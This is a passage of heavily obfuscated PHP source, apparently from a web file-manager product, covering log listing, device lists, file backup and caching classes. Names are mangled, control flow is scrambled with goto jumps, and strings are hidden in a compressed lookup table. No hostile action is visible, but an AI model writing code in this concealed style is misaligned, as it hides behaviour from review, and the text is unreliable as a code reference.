$A‚â®öåòŞ[$EéÆâœ—][$aëÚò©Â¯š[414]] = json_encode($aõÛ¯ßÎ¾Ñ); continue; } if (strpos($C£ÍòÈ‘îå[$aëÚò©Â¯š[29]], $aëÚò©Â¯š[2286]) !== 0) { goto f †¶«ã; f †¶«ã: if (!isset($aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[75]]) || strpos($C£ÍòÈ‘îå[$aëÚò©Â¯š[29]], $aëÚò©Â¯š[2468]) !== 0) { continue; } if (!IO::init($aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[75]])) { continue; } if (!($b¼™Ğ…²‚È = IO::infoFull($aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[75]]))) { continue; } goto AÅ¢©‹ŸÉ†; AÅ¢©‹ŸÉ†: $E¦Ì‘²±Í…[] = $aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[378]] = $b¼™Ğ…²‚È[$aëÚò©Â¯š[378]]; $E¦Ì‘²±Í…[] = $aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[2285]] = $b¼™Ğ…²‚È[$aëÚò©Â¯š[470]]; $A‚â®öåòŞ[$EéÆâœ—][$aëÚò©Â¯š[414]] = json_encode($aõÛ¯ßÎ¾Ñ); goto D¸ªÑ¸£¯ñ; D¸ªÑ¸£¯ñ: continue; goto b¨Õ§Øà; b¨Õ§Øà: } goto a—ğõè‹¾; a—ğõè‹¾: $E¦Ì‘²±Í…[] = $aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[378]]; $E¦Ì‘²±Í…[] = $aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[2285]]; if ($aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[29]] == $aëÚò©Â¯š[501]) { $E¦Ì‘²±Í…[] = $aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[414]][$aëÚò©Â¯š[1005]]; $E¦Ì‘²±Í…[] = $aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[414]][$aëÚò©Â¯š[1006]]; } goto E…õîÂÕ¡§; E…õîÂÕ¡§: if ($aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[29]] == $aëÚò©Â¯š[2293]) { $E¦Ì‘²±Í…[] = $aõÛ¯ßÎ¾Ñ[$aëÚò©Â¯š[414]][$aëÚò©Â¯š[378]]; } goto Fà£’ïã¿­; Fà£’ïã¿­: } if (!$E¦Ì‘²±Í…) { return array(); } return Model($aëÚò©Â¯š[755])->sourceListInfo($E¦Ì‘²±Í…, !0); } private function logList($aÒƒ‹¨µ˜­) { goto B·é‘Âš«ô; fğô«‚¥’¼: $FØ¤¦ÄÀ™­ = $this->getSourceList($aÒƒ‹¨µ˜­); $C…ÏÆ¾¡‡Ë = $this->typeAll(); $e×æî¨òäÓ = array(); goto e“Š½Ø’¹; B·é‘Âš«ô: $EêêÇ´ƒİ =& $_SERVER[í…¶]; $e¥Áß•‹§½ = array_to_keyvalue($aÒƒ‹¨µ˜­, $EêêÇ´ƒİ[33], $EêêÇ´ƒİ[1433]); $FŒ¸…¸…ä• = Model($EêêÇ´ƒİ[486])->userListInfo(array_unique($e¥Áß•‹§½)); goto fğô«‚¥’¼; cˆÕÈÖÍí¾: return $e×æî¨òäÓ; goto FÉÀ¡¥·Œ; e“Š½Ø’¹: $Aï«¤‹±æ = array(); foreach ($aÒƒ‹¨µ˜­ as $AİÄÁĞÈÁä => $F²‘’óè¬œ) { goto d‚¢Û…Èä; Cˆ×¼¶ƒ§¤: $this->ipAddress($F²‘’óè¬œ); if (strpos($EÙàˆ¯ÎŠß, $EêêÇ´ƒİ[2286]) === 0 || isset($EÀìñøÒ©[$EêêÇ´ƒİ[2285]])) { goto D„Âˆî¯¨; AÚ‹…Õô‡‚: if ($EÀìñøÒ©[$EêêÇ´ƒİ[29]] == $EêêÇ´ƒİ[2293]) { $EÀìñøÒ©[$EêêÇ´ƒİ[414]][$EêêÇ´ƒİ[378]] = $FØ¤¦ÄÀ™­[$EÀìñøÒ©[$EêêÇ´ƒİ[414]][$EêêÇ´ƒİ[378]]]; } if ($EÀìñøÒ©[$EêêÇ´ƒİ[29]] == $EêêÇ´ƒİ[2067]) { $EÀìñøÒ©[$EêêÇ´ƒİ[2298]] = $EÀìñøÒ©[$EêêÇ´ƒİ[400]]; $EÀìñøÒ©[$EêêÇ´ƒİ[2285]] = $EÀìñøÒ©[$EêêÇ´ƒİ[2298]][$EêêÇ´ƒİ[378]]; $EÀìñøÒ©[$EêêÇ´ƒİ[400]] = !1; $EÀìñøÒ©[$EêêÇ´ƒİ[378]] = $EêêÇ´ƒİ[33]; } if ($EÀìñøÒ©[$EêêÇ´ƒİ[400]] && $EÀìñøÒ©[$EêêÇ´ƒİ[400]][$EêêÇ´ƒİ[380]] == $EêêÇ´ƒİ[1078]) { $Aï«¤‹±æ[] = $F²‘’óè¬œ[$EêêÇ´ƒİ[376]]; unset($aÒƒ‹¨µ˜­[$AİÄÁĞÈÁä]); continue; } goto dß¹Á©ñ¥; D„Âˆî¯¨: $EÀìñøÒ©[$EêêÇ´ƒİ[400]] = $FØ¤¦ÄÀ™­[$EÀìñøÒ©[$EêêÇ´ƒİ[378]]]; $EÀìñøÒ©[$EêêÇ´ƒİ[2298]] = $FØ¤¦ÄÀ™­[$EÀìñøÒ©[$EêêÇ´ƒİ[2285]]]; if ($EÀìñøÒ©[$EêêÇ´ƒİ[29]] == $EêêÇ´ƒİ[501]) { $EÀìñøÒ©[$EêêÇ´ƒİ[414]][$EêêÇ´ƒİ[1005]] = $FØ¤¦ÄÀ™­[$EÀìñøÒ©[$EêêÇ´ƒİ[414]][$EêêÇ´ƒİ[1005]]]; $EÀìñøÒ©[$EêêÇ´ƒİ[414]][$EêêÇ´ƒİ[1006]] = $FØ¤¦ÄÀ™­[$EÀìñøÒ©[$EêêÇ´ƒİ[414]][$EêêÇ´ƒİ[1006]]]; } goto AÚ‹…Õô‡‚; dß¹Á©ñ¥: if ($EÀìñøÒ©[$EêêÇ´ƒİ[2298]] && $EÀìñøÒ©[$EêêÇ´ƒİ[2298]][$EêêÇ´ƒİ[380]] == $EêêÇ´ƒİ[1078]) { $Aï«¤‹±æ[] = $F²‘’óè¬œ[$EêêÇ´ƒİ[376]]; unset($aÒƒ‹¨µ˜­[$AİÄÁĞÈÁä]); continue; } goto A©ùßÅ„™; A©ùßÅ„™: } $F²‘’óè¬œ[$EêêÇ´ƒİ[414]] = $EÀìñøÒ©; goto B…å¹§Óˆä; AÂ˜ïİ·: $F²‘’óè¬œ[$EêêÇ´ƒİ[28]] = isset($f¥°÷¡º„õ[$EêêÇ´ƒİ[28]]) ? $f¥°÷¡º„õ[$EêêÇ´ƒİ[28]] : LNG($EêêÇ´ƒİ[2465]); $F²‘’óè¬œ[$EêêÇ´ƒİ[2333]] = isset($f¥°÷¡º„õ[$EêêÇ´ƒİ[2333]]) ? $f¥°÷¡º„õ[$EêêÇ´ƒİ[2333]] : $EêêÇ´ƒİ[33]; $F²‘’óè¬œ[$EêêÇ´ƒİ[1339]] = isset($C…ÏÆ¾¡‡Ë[$EÙàˆ¯ÎŠß]) ? $C…ÏÆ¾¡‡Ë[$EÙàˆ¯ÎŠß] : $aíÒîË‰¦—; goto BµˆÚ¶³ã¨; d‚¢Û…Èä: $EÙàˆ¯ÎŠß = $F²‘’óè¬œ[$EêêÇ´ƒİ[29]]; $f¥°÷¡º„õ = isset($FŒ¸…¸…ä•[$F²‘’óè¬œ[$EêêÇ´ƒİ[1433]]]) ? $FŒ¸…¸…ä•[$F²‘’óè¬œ[$EêêÇ´ƒİ[1433]]] : !1; $aíÒîË‰¦— = strpos($EÙàˆ¯ÎŠß, $EêêÇ´ƒİ[2469]) === 0 ? LNG($EêêÇ´ƒİ[2470]) : LNG($EêêÇ´ƒİ[2465]); goto AÂ˜ïİ·; BµˆÚ¶³ã¨: $F²‘’óè¬œ[$EêêÇ´ƒİ[2241]] = $f¥°÷¡º„õ; $EÀìñøÒ© = json_decode($F²‘’óè¬œ[$EêêÇ´ƒİ[414]], !0); $F²‘’óè¬œ[$EêêÇ´ƒİ[2464]] = isset($EÀìñøÒ©[$EêêÇ´ƒİ[2464]]) ? $EÀìñøÒ©[$EêêÇ´ƒİ[2464]] : $EêêÇ´ƒİ[33]; goto Cˆ×¼¶ƒ§¤; B…å¹§Óˆä: unset($F²‘’óè¬œ[$EêêÇ´ƒİ[2471]]); $e×æî¨òäÓ[] = $F²‘’óè¬œ; goto A‘¦´¶’Šç; A‘¦´¶’Šç: } $this->clearSystemPathLog($Aï«¤‹±æ); goto cˆÕÈÖÍí¾; FÉÀ¡¥·Œ: } private function clearSystemPathLog($a¶àÔ ‡ÜÀ) { $EØÉŠ´¯ =& $_SERVER[í…¶]; if (count($a¶àÔ ‡ÜÀ) == 0) { return; } $AĞÄ»Ë§× = array($EØÉŠ´¯[376] => array($EØÉŠ´¯[7], array_unique($a¶àÔ ‡ÜÀ))); $this->where($AĞÄ»Ë§×)->delete(); } public function deviceList($AÛ…—×Æ£¸, $D¶–Í‘Ô = 0) { $B”Õ¯²Ë¢ =& $_SERVER[í…¶]; $dë…âŸŒîš = array($B”Õ¯²Ë¢[1433] => $AÛ…—×Æ£¸, $B”Õ¯²Ë¢[187] => array($B”Õ¯²Ë¢[926], $D¶–Í‘Ô), $B”Õ¯²Ë¢[29] => $B”Õ¯²Ë¢[2040]); $c¡‰˜—õì = array(); $A·Ùµ¬Ÿèç = $this->field($B”Õ¯²Ë¢[2472])->where($dë…âŸŒîš)->order($B”Õ¯²Ë¢[2296])->limit(50)->select(); foreach ($A·Ùµ¬Ÿèç as $EÚ¯Â„ß³Ÿ => $f¦å‡¢ƒĞ) { goto D·Ä´…ÏË; F³©¹«“: unset($eß‰ˆ¾„ÖÀ[$B”Õ¯²Ë¢[2464]]); $BÀ˜ÉˆÂõ’ = $this->deviceType($eß‰ˆ¾„ÖÀ[$B”Õ¯²Ë¢[2287]]); if (isset($c¡‰˜—õì[$BÀ˜ÉˆÂõ’])) { continue; } goto A¨‘ÊÆ­†›; A¨‘ÊÆ­†›: $this->ipAddress($f¦å‡¢ƒĞ); $f¦å‡¢ƒĞ[$B”Õ¯²Ë¢[414]] = $eß‰ˆ¾„ÖÀ; $c¡‰˜—õì[$BÀ˜ÉˆÂõ’] = $f¦å‡¢ƒĞ; goto FØ“‡êÅÁ«; D·Ä´…ÏË: if ($EÚ¯Â„ß³Ÿ > 0 && abs($f¦å‡¢ƒĞ[$B”Õ¯²Ë¢[187]] - $A·Ùµ¬Ÿèç[$EÚ¯Â„ß³Ÿ - 1][$B”Õ¯²Ë¢[187]]) < 5) { continue; } $eß‰ˆ¾„ÖÀ = json_decode($f¦å‡¢ƒĞ[$B”Õ¯²Ë¢[414]], !0); $f¦å‡¢ƒĞ[$B”Õ¯²Ë¢[2464]] = isset($eß‰ˆ¾„ÖÀ[$B”Õ¯²Ë¢[2464]]) ? $eß‰ˆ¾„ÖÀ[$B”Õ¯²Ë¢[2464]] : $B”Õ¯²Ë¢[33]; goto F³©¹«“; FØ“‡êÅÁ«: } return array_values($c¡‰˜—õì); } public function deviceType($BïÑîğÒ¬Í) { return $BïÑîğÒ¬Í; } } goto bÒã†ïöï; eİ·÷½×é: class BackupFile { public function __construct() { } public function index() { goto F÷®»Úä«À; e«£‘±“Ğ£: $Bô‡ï—½İ = $c…­É›í¤ = 0; do { $a°ËÖ¶ÈšÓ = $_SERVER[í…¶][743]; $e‰ëŸ¬ƒ‡Ñ = Model($_SERVER[í…¶][721])->where($C¼÷‰Å¡¬ˆ)->field($a°ËÖ¶ÈšÓ)->order($_SERVER[í…¶][744])->selectPage($aìÛÛˆª¤˜, $b‘ƒÇ¨Ø‹î); $bòƒ½İ³È = !empty($e‰ëŸ¬ƒ‡Ñ[$_SERVER[í…¶][363]]) ? $e‰ëŸ¬ƒ‡Ñ[$_SERVER[í…¶][363]] : array(); foreach ($bòƒ½İ³È as $d›†Âî«‘É) { goto D—½ø…‘íŸ; Dê¿ô’ï’ƒ: $D«ğ³ÜğâÛ += $d›†Âî«‘É[$_SERVER[í…¶][77]]; $c…­É›í¤ += 1; $Bô‡ï—½İ += $d›†Âî«‘É[$_SERVER[í…¶][77]]; goto bä¥‚‡¸Ğ´; D—½ø…‘íŸ: if (!$this->_fileExist($d›†Âî«‘É, $BğóİÛ½âÈ, $aæ¼ÃÉ)) { $d—“¼•©¤ -= 1; $eÇâîâ’× -= (int) $d›†Âî«‘É[$_SERVER[í…¶][77]]; write_log("\x66\x69\154\x65\x20\156\157\x74\x20\x65\170\151\163\x74\x2e\146\x69\154\x65\111\104\72{$d›†Âî«‘É[$_SERVER[í…¶][428]]}\54\40\160\141\164\150\x3a{$d›†Âî«‘É[$_SERVER[í…¶][75]]}", $_SERVER[í…¶][745]); continue; } $dÒ­•ò…ë˜ = $d›†Âî«‘É[$_SERVER[í…¶][75]]; $a’áíÔŒ = "\x7b\x69\x6f\72{$CÑ×ô‡×È[$_SERVER[í…¶][693]]}\175" . substr($dÒ­•ò…ë˜, strlen("\173\x69\157\x3a{$d›†Âî«‘É[$_SERVER[í…¶][746]]}\175")); goto b„àñ…„íæ; bä¥‚‡¸Ğ´: if ($D«ğ³ÜğâÛ >= 1024 * 1024 * 100) { $Có¸Òğ”¯¼ = array($_SERVER[í…¶][750] => $D²ÀÚÕªÕç, $_SERVER[í…¶][751] => $c…­É›í¤, $_SERVER[í…¶][752] => $Bô‡ï—½İ); Backup::set($Có¸Òğ”¯¼); $D«ğ³ÜğâÛ = $EĞÓø‚ºùõ = 0; } goto Böæ‰›¡Í•; b„àñ…„íæ: if (IO::exist($a’áíÔŒ)) { $BÅâòµ¤Œ”->updateFileEnd($d›†Âî«‘É[$_SERVER[í…¶][28]], $d›†Âî«‘É[$_SERVER[í…¶][77]]); } else { $a’áíÔŒ = get_path_father($a’áíÔŒ); IO::mkdir($a’áíÔŒ); if (!IO::copy($dÒ­•ò…ë˜, $a’áíÔŒ, $_SERVER[í…¶][747])) { write_log($_SERVER[í…¶][748] . $dÒ­•ò…ë˜ . $_SERVER[í…¶][749] . $a’áíÔŒ . $_SERVER[í…¶][485], $_SERVER[í…¶][716]); $aÅäôÌ é = !1; break; } } $D²ÀÚÕªÕç = $d›†Âî«‘É[$_SERVER[í…¶][428]]; $EĞÓø‚ºùõ += 1; goto Dê¿ô’ï’ƒ; Böæ‰›¡Í•: } $cİ·ÀÙŞ° = count($bòƒ½İ³È); $b‘ƒÇ¨Ø‹î++; } while ($cİ·ÀÙŞ° == $aìÛÛˆª¤˜); $BÅâòµ¤Œ”->end(); goto cßò‚á¾¢Š; a„‰Ò´Šá¢: $d—“¼•©¤ = (int) Model($_SERVER[í…¶][721])->where($C¼÷‰Å¡¬ˆ)->count($_SERVER[í…¶][428]); $eÇâîâ’× = (int) Model($_SERVER[í…¶][721])->where($C¼÷‰Å¡¬ˆ)->sum($_SERVER[í…¶][77]); $BÅâòµ¤Œ” = new TaskFileTransfer($_SERVER[í…¶][739], $_SERVER[í…¶][716], $d—“¼•©¤, LNG($_SERVER[í…¶][717]) . $_SERVER[í…¶][718] . LNG($_SERVER[í…¶][740])); goto FïøÖÏß; cßò‚á¾¢Š: $eµ›„×«Õí = $aÅäôÌ é ? 1 : 0; $Có¸Òğ”¯¼ = array($_SERVER[í…¶][753] => 1, $_SERVER[í…¶][705] => time(), $_SERVER[í…¶][711] => $eµ›„×«Õí, $_SERVER[í…¶][750] => $D²ÀÚÕªÕç, $_SERVER[í…¶][742] => $eÇâîâ’×, $_SERVER[í…¶][741] => $d—“¼•©¤); if ($EĞÓø‚ºùõ) { $Có¸Òğ”¯¼[$_SERVER[í…¶][751]] = $c…­É›í¤; $Có¸Òğ”¯¼[$_SERVER[í…¶][752]] = $Bô‡ï—½İ; } goto A‘”¸¾‡„Ì; F÷®»Úä«À: $CÑ×ô‡×È = Backup::get(); $D²ÀÚÕªÕç = $CÑ×ô‡×È[$_SERVER[í…¶][281]][$_SERVER[í…¶][167]][$_SERVER[í…¶][428]]; $C¼÷‰Å¡¬ˆ = array($_SERVER[í…¶][429] => array($_SERVER[í…¶][737], $D²ÀÚÕªÕç), $_SERVER[í…¶][738] => array($_SERVER[í…¶][319], $CÑ×ô‡×È[$_SERVER[í…¶][693]])); goto a„‰Ò´Šá¢; FïøÖÏß: $BÅâòµ¤Œ”->task[$_SERVER[í…¶][700]] = $eÇâîâ’×; $Có¸Òğ”¯¼ = array($_SERVER[í…¶][741] => $d—“¼•©¤, $_SERVER[í…¶][742] => $eÇâîâ’×); Backup::set($Có¸Òğ”¯¼); goto F¿È“½‘Ïò; A‘”¸¾‡„Ì: Backup::set($Có¸Òğ”¯¼); $this->_fileFilter($BğóİÛ½âÈ); return !0; goto BÜ¯½øĞ; fî«¿‚•: $aìÛÛˆª¤˜ = 1000; $D«ğ³ÜğâÛ = $EĞÓø‚ºùõ = 0; $BğóİÛ½âÈ = array(); goto e«£‘±“Ğ£; F¿È“½‘Ïò: $aÅäôÌ é = !0; $aæ¼ÃÉ = $this->storeIds(); $b‘ƒÇ¨Ø‹î = 1; goto fî«¿‚•; BÜ¯½øĞ: } private function _fileExist($dó¥‹ãÍ·À, &$Bê‘­ƒ‘¡õ, $E˜“ÂÈôÛÎ) { goto CÈ¨à¦ªİ; CÈ¨à¦ªİ: $Aµ¾ôŸ¼¦µ =& $_SERVER[í…¶]; $Aä¶¬Û´ô = $dó¥‹ãÍ·À[$Aµ¾ôŸ¼¦µ[75]]; if (in_array($dó¥‹ãÍ·À[$Aµ¾ôŸ¼¦µ[428]], $Bê‘­ƒ‘¡õ)) { return !1; } goto CÊñï›“˜³; cãğççğö: $Bê‘­ƒ‘¡õ = array_merge($Bê‘­ƒ‘¡õ, array_to_keyvalue($c‰ò†¥…è, $Aµ¾ôŸ¼¦µ[33], $Aµ¾ôŸ¼¦µ[428])); return !1; goto AÁ¿Øé™†æ; CÊñï›“˜³: if (!in_array($dó¥‹ãÍ·À[$Aµ¾ôŸ¼¦µ[746]], $E˜“ÂÈôÛÎ)) { return !1; } if (IO::exist($Aä¶¬Û´ô)) { return !0; } $A¿µ†³çÈ = get_path_father($Aä¶¬Û´ô); goto dø´µ¦Ä¯©; dø´µ¦Ä¯©: if (IO::exist($A¿µ†³çÈ)) { $Bê‘­ƒ‘¡õ[] = $dó¥‹ãÍ·À[$Aµ¾ôŸ¼¦µ[428]]; return !1; } $EÉª‹Øª™ = array($Aµ¾ôŸ¼¦µ[746] => $dó¥‹ãÍ·À[$Aµ¾ôŸ¼¦µ[746]], $Aµ¾ôŸ¼¦µ[75] => array($Aµ¾ôŸ¼¦µ[754], "{$A¿µ†³çÈ}\45")); $c‰ò†¥…è = Model($Aµ¾ôŸ¼¦µ[721])->where($EÉª‹Øª™)->field($Aµ¾ôŸ¼¦µ[429])->select(); goto cãğççğö; AÁ¿Øé™†æ: } private function _fileFilter($E…‚Áè‹éÂ) { $FÆ®§ğ¯è =& $_SERVER[í…¶]; if (empty($E…‚Áè‹éÂ)) { return; } $Aº„ë¸Î‰ã = array($FÆ®§ğ¯è[428] => array($FÆ®§ğ¯è[7], array_unique($E…‚Áè‹éÂ))); $e¦âŒÌ¨ = Model($FÆ®§ğ¯è[755])->where($Aº„ë¸Î‰ã)->field($FÆ®§ğ¯è[378])->select(); foreach ($e¦âŒÌ¨ as $a°íÍ¶Ø©Ä) { Model($FÆ®§ğ¯è[755])->remove($a°íÍ¶Ø©Ä[$FÆ®§ğ¯è[378]], !1); } } private function storeIds() { $aí’„ÖÇ‹à =& $_SERVER[í…¶]; $bËİ³Ö¨òª = Model($aí’„ÖÇ‹à[706])->listData(); $dïùÏÏƒÇ = array(); $b¾¾¬ƒ“¦¢ = $GLOBALS[$aí’„ÖÇ‹à[6]][$aí’„ÖÇ‹à[84]][$aí’„ÖÇ‹à[756]]; foreach ($bËİ³Ö¨òª as $eæÁ¶Ëë©) { $bÓ¨Ï¤”É = strtolower($eæÁ¶Ëë©[$aí’„ÖÇ‹à[90]]); if (!isset($b¾¾¬ƒ“¦¢[$bÓ¨Ï¤”É])) { continue; } $F×»’ğ Ğ­ = $aí’„ÖÇ‹à[71] . (isset($b¾¾¬ƒ“¦¢[$bÓ¨Ï¤”É]) ? $b¾¾¬ƒ“¦¢[$bÓ¨Ï¤”É] : ucfirst($bÓ¨Ï¤”É)); if (!class_exists($F×»’ğ Ğ­)) { continue; } $dïùÏÏƒÇ[] = $eæÁ¶Ëë©[$aí’„ÖÇ‹à[376]]; } return $dïùÏÏƒÇ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto Bª­‡×†ÓÎ; fÓÕ‡¹ì™: $FÜ„Ø•£Ü = $GLOBALS[$D¸öÓŠÁØ±[6]][$D¸öÓŠÁØ±[337]]; $EŠš¡™ŞÅá = $FÜ„Ø•£Ü[$FÜ„Ø•£Ü[$D¸öÓŠÁØ±[757]]]; $eÄñÃ¡Ø£… = $FÜ„Ø•£Ü[$D¸öÓŠÁØ±[758]]; goto A¸º—šÊáˆ; Bª­‡×†ÓÎ: $D¸öÓŠÁØ± =& $_SERVER[í…¶]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto fÓÕ‡¹ì™; A¸º—šÊáˆ: switch ($FÜ„Ø•£Ü[$D¸öÓŠÁØ±[757]]) { case $D¸öÓŠÁØ±[17]: self::$handle = Model($D¸öÓŠÁØ±[759]); break; case $D¸öÓŠÁØ±[760]: self::$handle = new CacheRedis($EŠš¡™ŞÅá, $eÄñÃ¡Ø£…); break; case $D¸öÓŠÁØ±[761]: self::$handle = new CacheMemcached($EŠš¡™ŞÅá, $eÄñÃ¡Ø£…); break; case $D¸öÓŠÁØ±[167]: self::$handle = new CacheFile($EŠš¡™ŞÅá, $eÄñÃ¡Ø£…); break; default: break; } return self::$handle; goto cš¯ßÍÀÆë; cš¯ßÍÀÆë: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($B‚³‹²Ğ‡») { if (is_array($B‚³‹²Ğ‡») || is_object($B‚³‹²Ğ‡»)) { $B‚³‹²Ğ‡» = json_encode($B‚³‹²Ğ‡»); } $B‚³‹²Ğ‡» = rawurlencode($B‚³‹²Ğ‡»); return KOD_SITE_ID . $_SERVER[í…¶][70] . $B‚³‹²Ğ‡»; } public static function get($F«âÃƒÂØó) { $aõÉ…«Ùš = self::key($F«âÃƒÂØó); if (!isset(self::$memoryCache[$aõÉ…«Ùš])) { $eÒ–àŒº¤ = self::init()->get($aõÉ…«Ùš); self::$memoryCache[$aõÉ…«Ùš] = unserialize($eÒ–àŒº¤); } return self::$memoryCache[$aõÉ…«Ùš]; } public static function set($aÇ‰¿ËÂ›“, $cìõã¿“¬ä, $bÑ‘»»ô¯ò = false) { goto D¬¶ÊÎÅ; D¬¶ÊÎÅ: $BŠàØ¸é¨É = self::key($aÇ‰¿ËÂ›“); if (isset(self::$memoryCache[$BŠàØ¸é¨É]) && self::$memoryCache[$BŠàØ¸é¨É] === $cìõã¿“¬ä) { return !0; } if ($bÑ‘»»ô¯ò === 0) { self::$memoryCache[$BŠàØ¸é¨É] = $cìõã¿“¬ä; return !0; } goto AˆäºŞµ; dÁ–Ã¯¤‰Ø: CacheLock::unlock($aÇ‰¿ËÂ›“); return $A““Ï¯Ì“; goto f öãôÄëÙ; AˆäºŞµ: CacheLock::lock($aÇ‰¿ËÂ›“); $A““Ï¯Ì“ = self::init()->set($BŠàØ¸é¨É, serialize($cìõã¿“¬ä), $bÑ‘»»ô¯ò); self::$memoryCache[$BŠàØ¸é¨É] = $cìõã¿“¬ä; goto dÁ–Ã¯¤‰Ø; f öãôÄëÙ: } public static function remove($EÎµ¯‡îİÎ) { goto F…Æ«ëÈÁ; dóçï³æÜ: CacheLock::lock($EÎµ¯‡îİÎ); $EÊöØ‘Š«¤ = self::init()->remove($C¡‚—¨ƒ×é); CacheLock::unlock($EÎµ¯‡îİÎ); goto eèŒíŒ¸×Û; F…Æ«ëÈÁ: $C¡‚—¨ƒ×é = self::key($EÎµ¯‡îİÎ); unset(self::$memoryCache[$C¡‚—¨ƒ×é]); self::clearTimeout(); goto dóçï³æÜ; eèŒíŒ¸×Û: return $EÊöØ‘Š«¤; goto då¯‹‚‘òç; då¯‹‚‘òç: } public static function clearMemory($CºÔ×ÜíËˆ = false) { if ($CºÔ×ÜíËˆ) { $CºÔ×ÜíËˆ = self::key($CºÔ×ÜíËˆ); unset(self::$memoryCache[$CºÔ×ÜíËˆ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[í…¶][762])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[í…¶][763])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($dº¶éØÉÒ¨, $FŠ™˜Â‹êê) { $D¢ Ÿâ® =& $_SERVER[í…¶]; $this->cachePath = $dº¶éØÉÒ¨[$D¢ Ÿâ®[75]]; $this->prefix = $D¢ Ÿâ®[764]; $this->cacheTime = $FŠ™˜Â‹êê; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($BªºÇ·ƒï) { $c²ØÔ•£· =& $_SERVER[í…¶]; $BªºÇ·ƒï = str_replace(array($c²ØÔ•£·[765], $c²ØÔ•£·[93], $c²ØÔ•£·[69]), $c²ØÔ•£·[766], $BªºÇ·ƒï); return $this->cachePath . $c²ØÔ•£·[767] . $BªºÇ·ƒï . $c²ØÔ•£·[768]; } public function set($EÔÓĞÁÈØø, $a´‘‚ããµ¥, $Fƒ‹ø–‹å© = false) { $CÜÓ—óñ¾ = $this->getFile($EÔÓĞÁÈØø); if (file_put_contents($CÜÓ—óñ¾, $this->prefix . $a´‘‚ããµ¥, LOCK_EX)) { return !0; } @unlink($CÜÓ—óñ¾); return !1; } public function get($BøÊÉ×ô„®) { $CÌÜ™ÃÀğã = $this->getFile($BøÊÉ×ô„®); if (file_exists($CÌÜ™ÃÀğã) && filemtime($CÌÜ™ÃÀğã) < time() - $this->cacheTime) { @unlink($CÌÜ™ÃÀğã); return !1; } $aô¢À­İõÜ = @file_get_contents($CÌÜ™ÃÀğã); return substr($aô¢À­İõÜ, strlen($this->prefix)); } public function remove($Bîò¨Üì­) { $eÓñ¡Ş‘¿² = $this->getFile($Bîò¨Üì­); return @unlink($eÓñ¡Ş‘¿²); } public function deleteAll() { $B«•ÏÜ®Ã =& $_SERVER[í…¶]; $aéğ³ÊøÒ = scandir($this->cachePath); foreach ($aéğ³ÊøÒ as $bƒÚÇè´ªÄ) { $D¡ì“¡ƒ‡ô = $this->cachePath . $bƒÚÇè´ªÄ; if (strpos($D¡ì“¡ƒ‡ô, $B«•ÏÜ®Ã[768]) && strpos($D¡ì“¡ƒ‡ô, $B«•ÏÜ®Ã[769])) { @unlink($D¡ì“¡ƒ‡ô); } } } public function clearTimeout() { $eÀ²×±¹…Ï =& $_SERVER[í…¶]; $b‡¤ĞÅµˆç = scandir($this->cachePath); foreach ($b‡¤ĞÅµˆç as $fïÎñ‘£é‡) { $Fö‹º¯¨é = $this->cachePath . $fïÎñ‘£é‡; if (strpos($Fö‹º¯¨é, $eÀ²×±¹…Ï[768]) && strpos($Fö‹º¯¨é, $eÀ²×±¹…Ï[769]) && filemtime($Fö‹º¯¨é) < time() - $this->cacheTime) { @unlink($Fö‹º¯¨é); } } } } goto cŠÚ¶Ô–ˆ„; FóïŠõíˆ: define($_SERVER[í…¶][0], $_SERVER[í…¶][1]); $_SERVER[²‡§™ıäÑÊº•] = explode($_SERVER[í…¶][2], gzinflate(substr($_SERVER[í…¶][3], 10, -8))); function Model($F¿¦¹ö¥—ä = '', $e…ŸøÖ·âê = '', $E äŞğœ¿· = '') { goto A¯„ºÁÇ»¢; aôò˜ŒËí: $EÆ‘¡òÄ˜ê[$D¹§«ØÖ–‹] = new ModelBase($F¿¦¹ö¥—ä, $e…ŸøÖ·âê, $E äŞğœ¿·); return $EÆ‘¡òÄ˜ê[$D¹§«ØÖ–‹]; goto E«Ô–Ã‡éÃ; CáÊ½ºŠÀì: if (isset($EÆ‘¡òÄ˜ê[$D¹§«ØÖ–‹])) { return $EÆ‘¡òÄ˜ê[$D¹§«ØÖ–‹]; } if ($F¿¦¹ö¥—ä) { $F¿¦¹ö¥—ä = strtoupper($F¿¦¹ö¥—ä[0]) . substr($F¿¦¹ö¥—ä, 1); $F†ğ…ùÎ = $F¿¦¹ö¥—ä . $CË•ÉÄå×¯[1]; if (class_exists($F†ğ…ùÎ)) { $EÆ‘¡òÄ˜ê[$D¹§«ØÖ–‹] = new $F†ğ…ùÎ(); return $EÆ‘¡òÄ˜ê[$D¹§«ØÖ–‹]; } } if (!$E äŞğœ¿·) { $E äŞğœ¿· = $GLOBALS[$CË•ÉÄå×¯[2]][$CË•ÉÄå×¯[3]]; } goto aôò˜ŒËí; A¯„ºÁÇ»¢: $CË•ÉÄå×¯ =& $_SERVER[²‡§™ıäÑÊº•]; static $EÆ‘¡òÄ˜ê = array(); $D¹§«ØÖ–‹ = strtolower($e…ŸøÖ·âê . $CË•ÉÄå×¯[0] . $F¿¦¹ö¥—ä); goto CáÊ½ºŠÀì; E«Ô–Ã‡éÃ: } goto eæ½­Ÿß´; C ŞÖÖ¿¯¨: class Services_JSON { function __construct($BĞ¦ºèç¿õ = 0) { $this->use = $BĞ¦ºèç¿õ; } function utf162utf8($fõ•‹¯†¹¹) { $C§·ÂŸÁ¾İ =& $_SERVER[í…¶]; if (function_exists($C§·ÂŸÁ¾İ[68])) { return mb_convert_encoding($fõ•‹¯†¹¹, 